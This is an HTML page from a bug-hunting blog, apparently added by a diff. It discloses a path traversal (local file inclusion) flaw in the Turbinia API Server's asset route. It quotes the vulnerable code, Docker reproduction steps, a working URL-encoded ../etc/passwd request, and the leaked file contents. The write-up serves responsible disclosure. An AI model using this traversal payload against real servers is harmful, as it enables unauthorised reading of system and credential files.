@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Google: Local File Inclusion in Turbinia API Server | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Google: Local File Inclusion in Turbinia API Server" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" />
+<meta property="og:url" content="http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-08T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Google: Local File Inclusion in Turbinia API Server" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-08T10:31:06+08:00","datePublished":"2024-05-08T10:31:06+08:00","description":"Name","headline":"Google: Local File Inclusion in Turbinia API Server","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"},"url":"http://localhost:4000/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Google: Local File Inclusion in Turbinia API Server</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-05-08T10:31:06+08:00" itemprop="datePublished">May 8, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Local File Inclusion in Turbinia API Server</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the Turbinia API Server when requesting resource files under the <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>The <a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L47">route</a> <code class="language-plaintext highlighter-rouge">/assets/{catchall:path}</code> is used for serving CSS and JS resources for Turbinia Web service. The <code class="language-plaintext highlighter-rouge">catchall</code> parameter in url is not sanitized before appended to base path, an attacker can use <code class="language-plaintext highlighter-rouge">../</code> to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@ui_router.get(
+    '/assets/{catchall:path}', name='assets', include_in_schema=False)
+async def serve_assets(request: Request):
+  """Serves assets content."""
+  static_content_path = pathlib.Path(_config.WEBUI_PATH).joinpath('dist/assets')
+  path = request.path_params['catchall']
+  file = static_content_path.joinpath(path)
+  if os.path.exists(file):
+    return FileResponse(file)
+
+  raise HTTPException(status_code=404, detail='Not found')
+</code></pre></div></div>
+
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+
+<p>Following official <a href="https://turbinia.readthedocs.io/en/latest/user/install.html#docker-installation">docker tutorial</a> to set up the Turbinia service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/google/turbinia.git
+cd turbinia
+mkdir -p ./conf &amp;&amp; mkdir -p ./tmp &amp;&amp; mkdir -p ./evidence &amp;&amp; mkdir -p ./certs &amp;&amp; chmod 777 ./conf ./tmp ./evidence ./certs
+sed -f docker/local/local-config.sed turbinia/config/turbinia_config_tmpl.py &gt; conf/turbinia.conf
+</code></pre></div></div>
+<p>Then, edit the <code class="language-plaintext highlighter-rouge">./docker/local/docker-compose.yml</code>, in <code class="language-plaintext highlighter-rouge">turbinia-api-server</code> section, expose Turbinia API Server port <code class="language-plaintext highlighter-rouge">8000</code> to host mechine by adding <code class="language-plaintext highlighter-rouge">ports: - "8000:8000"</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+turbinia-api-server:
+        #image: "turbinia-api-server-dev" # Use this for local development and comment out below line
+        image: "us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-api-server:latest" # Latest stable
+        container_name: turbinia-api-server
+        depends_on:
+            - redis
+        volumes:
+            - $PWD/evidence:/evidence
+            - $PWD/conf/turbinia.conf:/etc/turbinia/turbinia.conf
+        environment:
+            - LC_ALL=C.UTF-8
+            - LANG=C.UTF-8
+            - TURBINIA_EXTRA_ARGS=${TURBINIA_EXTRA_ARGS}
+        expose:
+            - "8000"
+        ports:
+            - "8000:8000"
+...
+</code></pre></div></div>
+<p>Finally, bring up the local Turbinia stack:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose -f ./docker/local/docker-compose.yml up
+</code></pre></div></div>
+
+<p>After service up, the Turbinia API Server will listen on <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000</code> in browser and intecept requests using burp suite or chrome devtools. We can capture following request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/index-a76ac6aa.js HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: fakesession=hello
+Origin: http://0.0.0.0:8000
+Pragma: no-cache
+Referer: http://0.0.0.0:8000/web
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Modify the request by change <code class="language-plaintext highlighter-rouge">index-a76ac6aa.js</code> part to <code class="language-plaintext highlighter-rouge">..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> which is <code class="language-plaintext highlighter-rouge">../../../../../../etc/passwd</code> url-encoded content.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
+Accept: */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cache-Control: no-cache
+Cookie: fakesession=hello
+Origin: http://0.0.0.0:8000
+Pragma: no-cache
+Referer: http://0.0.0.0:8000/web
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
+Host: 127.0.0.1:8000
+Accept-Encoding: gzip, deflate
+Connection: close
+</code></pre></div></div>
+
+<p>Or just open link: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code> in browser.</p>
+
+<p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+turbinia:x:999:999::/home/turbinia:/sbin/nologin
+</code></pre></div></div>
+
+<p><img src="/assets/cve/Turbinia.png" alt="Turbinia" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the Turbinia API Server website.</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67">https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53">https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53</a></p>
+
+  </div><a class="u-url" href="/file-overwrite/2024/05/08/local-file-inclusion-in-turbinia.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
